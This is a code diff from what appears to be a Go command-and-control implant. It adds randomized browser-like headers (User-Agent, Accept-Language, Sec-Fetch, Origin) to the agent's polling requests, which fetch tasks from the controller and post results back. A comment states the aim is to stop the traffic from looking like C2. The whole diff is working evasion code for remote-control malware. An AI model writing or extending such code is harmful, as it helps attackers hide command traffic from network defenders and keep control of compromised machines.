@@ -244,12 +244,25 @@ func pollHello(client *http.Client, baseURL, clientID, token string, cfg config.
 	return pollPost(client, baseURL+"/api/poll/"+clientID+"/results", token, payload)
 }
 
+// addMalleableHeaders sets browser-like headers on req to match the WebSocket
+// dial's malleable profile.  Keeps HTTP poll traffic from looking like bare C2.
+func addMalleableHeaders(req *http.Request) {
+	req.Header.Set("User-Agent", randomProfile().UserAgent)
+	req.Header.Set("Accept-Language", malleableAcceptLanguages[mrand.Intn(len(malleableAcceptLanguages))])
+	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
+	req.Header.Set("Sec-Fetch-Site", "same-origin")
+	req.Header.Set("Sec-Fetch-Mode", "cors")
+	req.Header.Set("Sec-Fetch-Dest", "empty")
+}
+
 func pollFetchTasks(client *http.Client, baseURL, clientID, token string) ([]pollCommand, error) {
 	req, err := http.NewRequest("GET", baseURL+"/api/poll/"+clientID+"/tasks", nil)
 	if err != nil {
 		return nil, err
 	}
 	req.Header.Set("X-Agent-Token", token)
+	req.Header.Set("Accept", "application/json, text/plain, */*")
+	addMalleableHeaders(req)
 
 	resp, err := client.Do(req)
 	if err != nil {
@@ -291,6 +304,8 @@ func pollPost(client *http.Client, url, token string, payload interface{}) error
 	}
 	req.Header.Set("Content-Type", "application/json")
 	req.Header.Set("X-Agent-Token", token)
+	req.Header.Set("Origin", malleableOrigins[mrand.Intn(len(malleableOrigins))])
+	addMalleableHeaders(req)
 
 	resp, err := client.Do(req)
 	if err != nil {
